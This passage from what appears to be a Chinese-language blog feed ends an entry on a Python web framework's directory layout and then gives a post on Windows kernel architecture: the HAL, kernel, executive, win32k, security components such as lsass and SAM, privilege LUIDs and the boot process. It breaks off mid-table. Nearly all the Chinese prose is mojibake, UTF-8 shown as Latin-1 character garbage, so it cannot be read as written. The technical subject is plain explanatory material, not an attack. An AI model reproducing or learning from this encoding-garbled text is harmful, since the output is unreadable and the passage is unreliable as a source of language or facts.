class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ config</span><br><span class="line">â”‚   â”œâ”€â”€ client.conf</span><br><span class="line">â”‚   â”œâ”€â”€ database.conf        </span><br><span class="line">â”‚   â”œâ”€â”€ server.conf</span><br><span class="line">â”‚   â”œâ”€â”€ server.crt</span><br><span class="line">â”‚   â”œâ”€â”€ server.csr</span><br><span class="line">â”‚   â””â”€â”€ server.key</span><br><span class="line">â”œâ”€â”€ manage.py</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â”œâ”€â”€ requirements.txt</span><br><span class="line">â”œâ”€â”€ rprint.py</span><br><span class="line">â”œâ”€â”€ server</span><br><span class="line">â”‚   â”œâ”€â”€ db.py</span><br><span class="line">â”‚   â”œâ”€â”€ models.py     </span><br><span class="line">â”‚   â”œâ”€â”€ serialization.py</span><br><span class="line">â”‚   â”œâ”€â”€ server.py</span><br><span class="line">â”‚   â”œâ”€â”€ urls.py</span><br><span class="line">â”‚   â”œâ”€â”€ utils</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ autoreload.py</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ epollcontrol.py</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ functional.py</span><br><span class="line">â”‚   â””â”€â”€ views.py</span><br><span class="line">â””â”€â”€ test</span><br></pre></td></tr></table></figure><ul><li><p><strong>config</strong></p><p>åŒ…å«æ•°æ®åº“é…ç½®(<code>database.conf</code>)ï¼ŒSSLä½¿ç”¨çš„è¯ä¹¦(<code>server.csr</code>)å’Œkey(<code>server.key</code>)ï¼ŒsocketæœåŠ¡é…ç½®(<code>server.conf</code>)</p></li><li><p><strong>utils</strong></p><p>ä¸€äº›å¸®åŠ©æ¨¡å—</p></li><li><p><strong>server</strong></p><p>ä¸»è¦åŠŸèƒ½å®ç°ï¼ŒåŒ…æ‹¬è·¯ç”±ã€epollç®¡ç†ã€æ•°æ®åº“ç›¸å…³ï¼Œå…¶ä¸­<code>views.py</code>å¯ä»¥ç¼–å†™apiï¼Œ<code>urls.py</code>ä¸­è®¾ç½®è·¯ç”±</p></li><li><p><strong>test</strong></p><p>ä¸€äº›æµ‹è¯•ç”¨ä¾‹</p></li></ul><p>ç›®å‰åº”è¯¥ä¸“æ³¨äºç¬¬ä¸€å—ï¼šä¼˜åŒ–epollæ€§èƒ½ä»¥åŠwsgiã€asgiçš„å®ç°ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»0åˆ°1å¼€å‘ä¸€ä¸ªå‹‰å¼ºèƒ½ç”¨çš„python webâ€œæ¡†æ¶â€&lt;/p&gt;
&lt;p&gt;é¡¹ç›®åœ°å€ï¼š&lt;a href=&quot;https://github.com/Joe1sn/muud&quot;&gt;https://github.com/Joe1sn/muud&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="muud" scheme="https://joe1sn.eu.org/tags/muud/"/>
    
    <category term="web framework" scheme="https://joe1sn.eu.org/tags/web-framework/"/>
    
  </entry>
  
  <entry>
    <title>ã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘I. Windowsç³»ç»Ÿç»“æ„</title>
    <link href="https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/"/>
    <id>https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/</id>
    <published>2023-05-24T03:28:39.000Z</published>
    <updated>2023-06-01T14:31:05.149Z</updated>
    
    <content type="html"><![CDATA[<p>Windowsç³»ç»Ÿç»“æ„è¿˜æœ‰å¼•å¯¼è¿‡ç¨‹</p><span id="more"></span><h2 id="ia-å¤§è‡´ç»“æ„"><a class="markdownIt-Anchor" href="#ia-å¤§è‡´ç»“æ„"></a> I.a å¤§è‡´ç»“æ„</h2><p>windowså†…æ ¸æ˜¯ä»<code>windows NT</code>å†…æ ¸å‘å±•è¿‡æ¥çš„ï¼Œä»å¼€å§‹å°±å’Œç¡¬ä»¶çš„å‘å±•æ¯æ¯ç›¸å…³ã€‚</p><p>Windowsé‡‡ç”¨åŒæ¨¡å¼ï¼ˆ<code>dual mode</code>ï¼‰ç»“æ„æ¥ä¿æŠ¤æ“ä½œç³»ç»Ÿå†…æ ¸ä¸å—åº”ç”¨ç¨‹åºçš„é”™è¯¯è€Œå‡ºç°å´©æºƒ</p><p><img src="https://img.joe1sn.top/uploads/big/268a5b458897e4a4a77a3368415c50a7.png" alt="img" /></p><p>windowsçš„åŸå§‹è®¾è®¡æ˜¯ä¸€ä¸ªæ”¯æŒå¤šç¯å¢ƒå­ç³»ç»Ÿçš„osï¼Œå®ƒè¿˜æ”¯æŒPOSIXå’ŒOS/2ç¯å¢ƒå­ç³»ç»Ÿ.ä¸ºä»–ä»¬æä¾›ä»¿çœŸæ‰§è¡Œç¯å¢ƒ</p><h2 id="ib-windowså†…æ ¸ç»„æˆç»“æ„"><a class="markdownIt-Anchor" href="#ib-windowså†…æ ¸ç»„æˆç»“æ„"></a> I.b windowså†…æ ¸ç»„æˆç»“æ„</h2><p><img src="https://img.joe1sn.top/uploads/big/b2e4ecf4e493b23fd28d8640d524aac3.png" alt="å†…æ ¸ç»„æˆç»“æ„.drawio" /></p><p>å…³äºå‡½æ•°çš„å¼€å¤´</p><ul><li><code>nt</code>ï¼šå†…æ ¸æä¾›çš„æœåŠ¡</li><li><code>Ldr</code>ï¼šæ˜ åƒåŠ è½½å™¨å‡½æ•°</li><li><code>Csr</code>ï¼šWindowså­è¿›ç¨‹é€šè®¯å‡½æ•°</li><li><code>Dbg</code>ï¼šè°ƒè¯•å‡½æ•°</li><li><code>Etw</code>ï¼šç³»ç»Ÿæ—¶é—´å‡½æ•°</li><li><code>Rtl</code>ï¼šè¿è¡Œæ”¯æŒå‡½æ•°</li></ul><p>æ‰§è¡Œä½“APIå‡½æ•°æ¥æ”¶çš„å‚æ•°æ¥è‡ªå„ç§åº”ç”¨ç¨‹åºï¼Œé€šå¸¸ä¼šåœ¨ç¨‹åºçš„æœ€å¼€å§‹å¤„ï¼Œå¯¹æ‰€æ¥å—çš„å‚æ•°é€ä¸€æ¢æŸ¥ä»–ä»¬çš„å¯è®¿é—®æ€§ã€‚</p><h1 id="ii-windowså†…æ ¸å…³é”®ç»„ä»¶"><a class="markdownIt-Anchor" href="#ii-windowså†…æ ¸å…³é”®ç»„ä»¶"></a> II. windowså†…æ ¸å…³é”®ç»„ä»¶</h1><h2 id="hal-ç¡¬ä»¶æŠ½è±¡å±‚"><a class="markdownIt-Anchor" href="#hal-ç¡¬ä»¶æŠ½è±¡å±‚"></a> HAL ç¡¬ä»¶æŠ½è±¡å±‚</h2><p>HALé€šå¸¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œwindowsè‡ªèº«æºå¸¦å¤šç§HALï¼Œä½†æ˜¯åœ¨ç³»ç»Ÿå®‰è£…çš„æ—¶å€™åªä¼šé€‰æ‹©ä¸€ç§ï¼Œæ”¹åä¸º<code>hal.dll</code>ã€‚æ¶‰åŠä¸­æ–­æ§åˆ¶å™¨ã€å•å¤„ç†å™¨/å¤šå¤„ç†å™¨ç¡¬ä»¶æ–­ç‚¹ã€‚</p><h2 id="å†…æ ¸å¾®å†…æ ¸"><a class="markdownIt-Anchor" href="#å†…æ ¸å¾®å†…æ ¸"></a> å†…æ ¸ï¼ˆå¾®å†…æ ¸ï¼‰</h2><p>åœ¨å†…æ ¸æ¨¡å—<code>ntoskrnl.exe</code>ä¸­çš„ä¸Šå±‚éƒ¨åˆ†ä¸ºæ‰§è¡Œä½“ï¼Œä¸‹å±‚æœ€æ¥è¿‘HALçš„å°±æ˜¯å†…æ ¸ã€‚è´Ÿè´£è¿›ç¨‹è°ƒåº¦ã€ä¸­æ–­å’Œå¼‚å¸¸å¤„ç†ï¼Œæ ¸å¿ƒä»»åŠ¡æ˜¯å°½å¯èƒ½è®©ç³»ç»Ÿä¸­çš„æ‰€æœ‰å¤„ç†å™¨å˜å¾—é«˜æ•ˆã€‚</p><p>windowså†…æ ¸ä½¿ç”¨æŠ¢å å¼è°ƒåº¦ï¼Œç”±äºé‡‡ç”¨é¢å‘å¯¹è±¡çš„è®¾è®¡ï¼Œä½¿å¾—å®ƒä¸»è¦é¢å‘ä¸¤ä¸ªå¯¹è±¡ï¼š<strong>åˆ†å‘å™¨</strong> å’Œ <strong>æ§åˆ¶</strong> ä¸¤ä¸ªå¯¹è±¡</p><ul><li>åˆ†å‘å™¨å¯¹è±¡ï¼šå®ç°å„ç§åŒæ­¥åŠŸèƒ½ã€‚å½±å“çº¿ç¨‹è°ƒåº¦ï¼Œä¸»è¦ç”¨äº <strong>äº‹ä»¶(event)</strong> <strong>çªå˜ä½“(mutant) ä¿¡å·é‡(semaphore) è¿›ç¨‹(process) çº¿ç¨‹(thread) é˜Ÿåˆ—(query) é—¨(gate) å®šæ—¶å™¨(timer)</strong></li><li>æ§åˆ¶å¯¹è±¡ï¼šç”¨äºæ§åˆ¶å†…æ ¸çš„æ“ä½œï¼Œä¸å½±å“çº¿ç¨‹è°ƒåº¦ã€‚åŒ…æ‹¬ <strong>å¼‚æ­¥è°ƒç”¨(APC) å»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨(DPC) ä¸­æ–­å¯¹è±¡</strong></li></ul><h2 id="æ‰§è¡Œä½“"><a class="markdownIt-Anchor" href="#æ‰§è¡Œä½“"></a> æ‰§è¡Œä½“</h2><p>åœ¨å†…æ ¸æ¨¡å—<code>ntoskrnl.exe</code>ä¸­çš„ä¸Šå±‚éƒ¨åˆ†ï¼ŒåŒ…å«5ç§ç±»å‹çš„å‡½æ•°</p><ul><li>è¢«å¯¼å‡ºçš„ã€å¯ä»¥åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è°ƒç”¨çš„å‡½æ•°ã€‚ä½äº <code>ntdll.dll</code> ä¸­ã€‚ä¸€èˆ¬å°±æ˜¯win API</li><li>æ²¡æœ‰è¢«å¯¼å‡ºã€å¯ä»¥åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è°ƒç”¨çš„å‡½æ•°ã€‚æ¯”å¦‚å¸¸è§çš„åè°ƒè¯•å‡½æ•°ï¼ŒåŒ…æ‹¬å„ç§LRC(<code>Local Process Call</code>ï¼Œæœ¬åœ°è°ƒç”¨è¿‡ç¨‹)ã€å„ç§æŸ¥è¯¢å‡½æ•°å’Œä¸“ä¸šå‡½æ•°ã€‚</li><li>åªèƒ½åœ¨å†…æ ¸æ¨¡å¼ä¸‹è°ƒç”¨çš„å¯¼å‡ºå‡½æ•°ã€‚åœ¨<code>windows DDK</code>ä¸­æœ‰æ–‡æ¡£ã€‚</li><li>æ‰§è¡Œä½“ä¹‹é—´å†…éƒ¨è°ƒç”¨ï¼Œæœªè¢«æ–‡æ¡£åŒ–çš„å‡½æ•°</li><li>ä¸€ä¸ªç»„ä»¶çš„å†…ç½®å‡½æ•°</li></ul><p>å…¶ä¸­ç»„ä»¶åŒ…æ‹¬</p><ul><li>è¿›ç¨‹å’Œçº¿ç¨‹ç®¡ç†å™¨ï¼šè´Ÿè´£è¿›ç¨‹/çº¿ç¨‹çš„CURD</li><li>å†…å­˜ç®¡ç†ï¼šè™šæ‹Ÿå†…å­˜</li><li>å®‰å…¨å¼•ç”¨ç›‘è§†å™¨ï¼ˆSRMï¼‰ï¼šç»´æŠ¤æœ¬åœ°è®¡ç®—æœºçš„å®‰å…¨ç­–ç•¥</li><li>I/Oç®¡ç†å™¨</li><li>ç¼“å­˜ç®¡ç†å™¨ï¼šå…è®¸ç£ç›˜å°†æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­</li><li>é…ç½®ç®¡ç†å™¨ï¼šè´Ÿè´£æ³¨å†Œè¡¨çš„å®ç°</li><li>å³æ’å³ç”¨ç®¡ç†å™¨</li></ul><p>è¿˜æœ‰çš„å‡½æ•°è´Ÿè´£å¯¹æ‰§è¡Œä½“è¿›è¡Œç®¡ç†</p><ul><li>å¯¹è±¡ç®¡ç†å™¨ï¼šæ‰§è¡Œä½“å¯¹è±¡çš„CURD</li><li>LPCè®¾æ–½ï¼šè´Ÿè´£åŒä¸€è®¾å¤‡çš„çš„å®¢æˆ·è¿›ç¨‹å’ŒæœåŠ¡è¿›ç¨‹çš„æ¶ˆæ¯ä¼ é€’ï¼Œå¯¹åº”çš„æ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰</li><li>è¿è¡Œæ—¶åº“å‡½æ•°</li><li>æ‰§è¡Œä½“æ”¯æŒä¾‹ç¨‹ï¼šå†…å­˜çš„åˆ†é…ã€äº’é”å†…å­˜çš„è½¬æ¢</li></ul><h2 id="è®¾å¤‡é©±åŠ¨ç¨‹åº"><a class="markdownIt-Anchor" href="#è®¾å¤‡é©±åŠ¨ç¨‹åº"></a> è®¾å¤‡é©±åŠ¨ç¨‹åº</h2><p>é©±åŠ¨æ–‡ä»¶ï¼ˆ<code>.sys</code>ï¼‰ï¼Œæ¼æ´æŒ–æ˜å­˜åœ¨äº<code>IOCTL</code></p><h2 id="æ–‡ä»¶ç³»ç»Ÿå­˜å‚¨ç®¡ç†"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ç³»ç»Ÿå­˜å‚¨ç®¡ç†"></a> æ–‡ä»¶ç³»ç»Ÿ/å­˜å‚¨ç®¡ç†</h2><p>ä¸»è¦æ˜¯<code>ntfs.sys</code>ã€‚æ¼æ´æŒ–æ˜å­˜åœ¨äº<code>CLFS</code>ï¼ˆé€šç”¨æ—¥å¿—æ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚</p><h2 id="ç½‘ç»œ"><a class="markdownIt-Anchor" href="#ç½‘ç»œ"></a> ç½‘ç»œ</h2><p>windowså¥—æ¥å­—ã€winInetã€NetBIOSã€RPC</p><h1 id="iii-windowså­ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#iii-windowså­ç³»ç»Ÿ"></a> III. windowså­ç³»ç»Ÿ</h1><p>åœ¨ä¸Šé¢çš„å†…æ ¸éƒ¨åˆ†å·²ç»å®ç°äº†å¯¹ç¡¬ä»¶çš„ç®€å•è®¿é—®æ§åˆ¶ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨æ¬¡åŸºç¡€ä¸Šè¿›è¡Œè·Ÿé«˜å±‚æ¬¡çš„å»ºè®¾ã€‚</p><p>åœ¨PEæ–‡ä»¶çš„å¤´éƒ¨åŸŸ<code>Subssytem</code>ä¸­æŒ‡å®šäº†è¯¥ç¨‹åºä¼šåœ¨é‚£ä¸ªå­ç¯å¢ƒä¸­è¿è¡Œã€‚</p><p>å­ç³»ç»Ÿä¹Ÿåˆ†ä¸ºç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼ï¼Œ<strong>æ ¸å¿ƒéƒ¨åˆ†æ˜¯ win32k.sys</strong>ã€‚å­ç³»ç»Ÿçš„DLLé“¾æ¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼ŒåŒ…æ‹¬<code>kernel32.dll</code> <code>user32.dll</code> <code>gdi32.dll</code> <code>advapi.dll</code>ï¼Œè´Ÿè´£å®ç°æ–‡æ¡£åŒ–çš„windowså‡½æ•°ã€‚</p><p>win32k.sysåŒæ—¶ä¹Ÿè´Ÿè´£å‘å†…æ ¸æ³¨å…¥ä¸€ç³»åˆ—å‡ºè°ƒå‡½æ•°(callout)ï¼Œä¸€æ—¦è°ƒç”¨äº†win32k.sysçš„ä»»ä½•ä¸€ä¸ªç³»ç»ŸæœåŠ¡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šå˜æˆä¸€ä¸ªGDIçº¿ç¨‹</p><p>æ ¸å¿ƒåŠŸèƒ½å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><p>çª—å£ç®¡ç†</p><p>ç”±windowså­è¿›ç¨‹<code>csrss.exe</code>è´Ÿè´£æ§åˆ¶å°çª—å£åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å­ç³»ç»Ÿä¼šè¯---&gt;äº¤äº’å¼çª—å£ç«™---&gt;é»˜è®¤æ¡Œé¢---&gt;é¡¶çº§çª—æˆ·å£åˆ—è¡¨-&gt;å­çª—å£</span><br><span class="line">          |             |_&gt;ç™»å½•çª—å£</span><br><span class="line">          |             |_&gt;å±å¹•ä¿æŠ¤çª—å£</span><br><span class="line">          |-&gt;éäº¤äº’å¼çª—å£--&gt;ä¸å¯è§æ¡Œé¢</span><br></pre></td></tr></table></figure></li><li><p>å›¾å½¢è®¾å¤‡æ¥å£(GDI)</p><p>ä¸»è¦æ˜¯å›¾å½¢æ”¯æŒï¼Œè®¾è®¡Direct3Dç­‰</p></li></ul><h1 id="iv-å®‰å…¨æ€§ç®¡ç†"><a class="markdownIt-Anchor" href="#iv-å®‰å…¨æ€§ç®¡ç†"></a> IV. å®‰å…¨æ€§ç®¡ç†</h1><p>ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š<strong>winlogon</strong>ã€<strong>SRM</strong> å’Œ <strong>lsass</strong></p><p>winlogon å’Œ lsass æ˜¯ä¸¤ä¸ªç”¨æˆ·æ¨¡å¼è¿›ç¨‹ï¼Œ è€Œ SRM æ˜¯ Windows æ‰§è¡Œä½“ä¸­çš„ç»„ä»¶</p><p><img src="https://img.joe1sn.top/uploads/big/9af8f1b52745a7587e3e81ae3a156eaf.png" alt="image-20230601094755027" /></p><ul><li>SRMï¼ˆSecurity Reference Monitorå®‰å…¨å¼•ç”¨ç›‘è§†å™¨ï¼‰ï¼Œè´Ÿè´£æ‰§è¡Œå¯¹è±¡çš„å®‰å…¨è®¿é—®æ£€æŸ¥ã€ç®¡ç†ç”¨æˆ·ç‰¹æƒã€ç”Ÿæˆå®‰ å…¨å®¡è®¡æ¶ˆæ¯ï¼Œå¹¶ä¸”å®šä¹‰äº†è®¿é—®ä»¤ç‰Œæ•°æ®ç»“æ„æ¥è¡¨ç¤ºä¸€ä¸ªå®‰å…¨ç¯å¢ƒã€‚</li><li>Winlogonï¼Œè´Ÿè´£å“åº” SASï¼ˆå®‰å…¨æ³¨æ„åºåˆ—ï¼‰ï¼Œä»¥åŠç®¡ç†äº¤äº’å¼ç™»å½•ä¼šè¯ã€‚å½“ç”¨æˆ·ç™» å½•åˆ°ç³»ç»Ÿä¸­æ—¶ï¼Œwinlogon åˆ›å»ºä¸€ä¸ªåˆå§‹è¿›ç¨‹ï¼Œå¹¶è¿›ä¸€æ­¥ç”±å®ƒåˆ›å»ºå¤–å£³ï¼ˆshellï¼‰è¿›ç¨‹ã€‚</li><li>Lsassï¼ˆLocal Security Authentic SubSystemæœ¬åœ°å®‰å…¨æƒå¨å­ç³»ç»Ÿï¼‰ï¼Œè´Ÿè´£æœ¬åœ°ç³»ç»Ÿçš„å®‰å…¨ç­–ç•¥ï¼ŒåŒæ—¶ï¼Œå®ƒä¹Ÿè®¤è¯ç”¨æˆ·çš„ èº«ä»½ï¼Œä»¥åŠå°†å®‰å…¨å®¡è®¡æ¶ˆæ¯å‘é€åˆ°ç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ä¸­ã€‚</li><li>SAMï¼ˆå®‰å…¨è´¦æˆ·ç®¡ç†å™¨ï¼‰æ•°æ®åº“ï¼ŒåŒ…å«äº†æœ¬åœ°ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œä»¥åŠå®ƒä»¬çš„å£ä»¤å’Œå…¶ ä»–å±æ€§ã€‚å®ƒä½äºæ³¨å†Œè¡¨çš„ HKLM\SAM ä¸‹é¢ã€‚ç”±äº HKLM\SAM é”®åªå…è®¸æœ¬åœ°ç³»ç»Ÿè´¦ æˆ·è®¿é—®ï¼Œæ‰€ä»¥ï¼Œé™¤éç”¨æˆ·åœ¨ Local System è´¦æˆ·ä¸‹è¿è¡Œ regedit.exe å·¥å…·ï¼Œå¦åˆ™æ— æ³•è®¿é—® HKLM\SAM å­æ ‘ã€‚</li><li>LSA ç­–ç•¥æ•°æ®åº“ï¼ŒåŒ…å«äº†æœ‰å…³å½“å‰ç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œè­¬å¦‚è°å…è®¸è®¿é—®ç³»ç»Ÿä»¥åŠå¦‚ä½• è®¿é—®ï¼ˆäº¤äº’å¼ç™»å½•ã€ç½‘ç»œç™»å½•æˆ–è€…ä»¥æœåŠ¡æ–¹å¼ç™»å½•ï¼‰ï¼›åˆ†é…ç»™è°å“ªäº›ç‰¹æƒï¼›å®‰å…¨å®¡è®¡ å¦‚ä½•è¿›è¡Œç­‰ã€‚å¦‚åŒ SAM æ•°æ®åº“ä¸€æ ·ï¼ŒLSA ç­–ç•¥æ•°æ®åº“ä¹Ÿå­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­ï¼Œä½äº HKLM\SECURITY ä¸‹é¢ã€‚åŒæ ·åœ°ï¼Œé™¤äº† Local System è´¦æˆ·ä»¥å¤–çš„å…¶ä»–è´¦æˆ·å‡æ— æ³•è®¿ é—® HKLM\SECURITY å­æ ‘ã€‚</li></ul><p>winlogon è´Ÿè´£<strong>ç³»ç»Ÿç™»å½•</strong>ï¼ŒåŒ…æ‹¬å¯¹ç”¨æˆ·èº«ä»½çš„è®¤è¯ï¼›<strong>lsass è´Ÿè´£ç®¡ç†ç³»ç»Ÿæœ¬åœ°å®‰å…¨ç­–ç•¥</strong>ï¼Œå¹¶ä¸”å°†è¿™äº›ç­–ç•¥é€šçŸ¥åˆ°å†…æ ¸ä¸­çš„ SRMã€‚åœ¨å†…æ ¸ ä¸­ï¼ŒSRM è´Ÿè´£å®ç°åŸºäºå¯¹è±¡çš„è®¿é—®æ§åˆ¶ä»¥åŠç³»ç»Ÿå…¨å±€å®‰å…¨ç­–ç•¥çš„å®æ–½ã€‚</p><h2 id="å…³äºä¸€äº›ææƒ"><a class="markdownIt-Anchor" href="#å…³äºä¸€äº›ææƒ"></a> å…³äºä¸€äº›ææƒ</h2><p>åœ¨ Windows ä¸­ï¼Œç‰¹æƒæ˜¯ç”± LUID å¯¹è±¡æ¥æ ‡è¯†çš„ï¼ŒLUID ä»£è¡¨ä¸€ä¸ªæœ¬åœ°å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆLocally  Unique Identifierï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LUID_AND_ATTRIBUTES</span> &#123;</span> </span><br><span class="line"> LUID Luid; </span><br><span class="line"> ULONG Attributes; </span><br><span class="line"> &#125; LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES; </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_ENABLED (0x00000002L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_REMOVED (0X00000004L) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PRIVILEGE_USED_FOR_ACCESS (0x80000000L)</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5b43b7eea8f959062d9d429d24c4b7ef.png" alt="image-20230601100327861" /></p><p>Windows å†…æ ¸ä¸­å®šä¹‰äº†ä¸€ç»„ç‰¹æƒï¼Œå³ç±»å‹ä¸º LUID çš„ Seå…¨å±€å˜é‡ã€‚Windows å†…æ ¸ä¸­ï¼Œä¸å®‰å…¨ç›¸å…³çš„å‡½æ•°ä»¥â€œSeâ€ä½œä¸ºå‰ç¼€ï¼Œæœ‰ä¸€äº›å®‰å…¨å‡½æ•°è¿˜å­˜åœ¨å¯¹åº”çš„ç³» ç»ŸæœåŠ¡ã€‚è¿™äº›ç³»ç»ŸæœåŠ¡å‡½æ•°çš„åç§°ä»¥â€œNtâ€ä½œä¸ºå‰ç¼€ï¼Œåé¢éƒ¨åˆ†ä¸â€œSeâ€å‡½æ•°ç›¸åŒã€‚</p><h1 id="v-windowsçš„å¼•å¯¼è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#v-windowsçš„å¼•å¯¼è¿‡ç¨‹"></a> V. Windowsçš„å¼•å¯¼è¿‡ç¨‹</h1><p>æœ€å¼€å§‹ä¹Ÿæ˜¯ä»ç»å…¸çš„MBRå¼€å§‹ï¼Œç„¶åæ˜¯ntldrçš„osloaderã€‚</p><p>åœ¨osloaderä¸­å°†ç‰©ç†åœ°å€è½¬ä¸ºè™šæ‹Ÿåœ°å€ï¼Œè¯¥è¿‡ç¨‹å¯è§ï¼šwindows_kernel_driver_2ä¸­å¯¹CR3ã€CR4å¯„å­˜å™¨çš„æ§åˆ¶ã€‚</p><p>ä¹‹åosloaderåŠ è½½NTDETECT.COMç¨‹åºï¼Œåˆ©ç”¨ç³»ç»ŸBIOSæŸ¥è¯¢ç³»ç»ŸåŸºæœ¬è®¾å¤‡ï¼Œåœ¨å¼•å¯¼è¿‡ç¨‹çš„åæœŸè¢«å­˜æ”¾åˆ°æ³¨å†Œè¡¨ HKLM\HARDWARE\DESCRIPTION</p><p>os loader åŠ è½½å†…æ ¸æ¨¡å—æ˜ åƒæ–‡ä»¶ï¼Œé»˜è®¤ä¸º ntoskrnl.exeï¼Œä»¥åŠ HAL æ˜ åƒæ–‡ä»¶ï¼Œé»˜ è®¤ä¸º hal.dllã€‚å†åŠ è½½æ³¨å†Œè¡¨çš„ SYSTEM å‚¨å·¢ï¼Œå³\WINDOWS\system32\config\system æ–‡ä»¶ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/1b982f19ef122b020f794aa867004e2b.png" alt="image-20230601100916238" /></p><p>ç„¶åæ˜¯å†…æ ¸çš„åˆå§‹åŒ–ï¼Œæ­¤å…¥å£å‡½æ•°ä¸º <code>KiSystemStartup</code></p><p>ä¸ºäº†è§£å†³åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­çš„ç›¸äº’ä¾èµ– æ€§é—®é¢˜ï¼Œå†…æ ¸çš„åˆå§‹åŒ–åˆ†ä¸¤ä¸ªé˜¶æ®µè¿›è¡Œï¼Œç§°ä¸ºé˜¶æ®µ 0 å’Œé˜¶æ®µ 1ã€‚å¤§å¤šæ•°å†…æ ¸ç»„ä»¶çš„åˆå§‹åŒ–å‡½ æ•°ç›¸åº”åœ°å¸¦æœ‰ä¸€ä¸ªæ•´æ•°å‚æ•°ï¼Œä»¥æŒ‡æ˜ä¸€æ¬¡è°ƒç”¨æ˜¯é˜¶æ®µ 0 åˆå§‹åŒ–è¿˜æ˜¯é˜¶æ®µ 1 åˆå§‹åŒ–ï¼Œè€Œæœ‰äº›ç»„ ä»¶çš„åˆå§‹åŒ–å‡½æ•°é€šè¿‡æ£€æŸ¥ä¸€ä¸ªå…¨å±€å˜é‡ InitializationPhase çš„å€¼æ¥åˆ¤æ–­å½“å‰å¤„äºå“ªä¸ªé˜¶æ®µã€‚</p><p>é˜¶æ®µ 0 åˆå§‹åŒ–çš„ç›®çš„æ˜¯ï¼Œå°†é˜¶æ®µ 1 åˆå§‹åŒ–æ‰€è¦ç”¨åˆ°çš„åŸº æœ¬æ•°æ®ç»“æ„å»ºç«‹èµ·æ¥ã€‚è¿™æ—¶ä¸­æ–­è¢«ç¦æ­¢ï¼Œè°ƒæ•´IDTã€TSSã€PCRç­‰ã€‚æ¥ç€è°ƒç”¨ KiInitializeKernel å‡½æ•°ï¼Œæ‰§è¡Œå†…æ ¸åˆå§‹åŒ–ã€‚æœ€åï¼Œå½“å‰çº¿ç¨‹èœ•å˜æˆä¸€ä¸ªç©ºé—²çº¿ç¨‹ã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/37b5a3335cbcb32366e40e7111162964.png" alt="image-20230601101312886" /></p><h1 id="v-windowså‘å¸ƒå†å²"><a class="markdownIt-Anchor" href="#v-windowså‘å¸ƒå†å²"></a> V. Windowså‘å¸ƒå†å²</h1><p>MicroSoftåœ¨æ“ä½œç³»ç»Ÿé¢†åŸŸä¸­æœ€å¼€å§‹èµ·æºäºMS-DOSï¼Œéšåæ¼”å˜å‡ºäº†ä¸¤ä¸ªåˆ†æ”¯ï¼Œæœ€å¼€å§‹çš„<code>Win 95/98/Me</code>ï¼Œä¹‹åå°±æ˜¯åŸºäº<code>Windows NT</code>çš„å†…æ ¸ç‰ˆæœ¬çš„<code>Window XP/7/8/10/vista</code>çš„ç‰ˆæœ¬ã€‚</p><table><thead><tr><th>ç‰ˆæœ¬</th><th>å‘å¸ƒæ—¥æœŸ</th><th>ä¸»è¦ç‰¹ç‚¹</th><th>å†…æ ¸ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>Windows 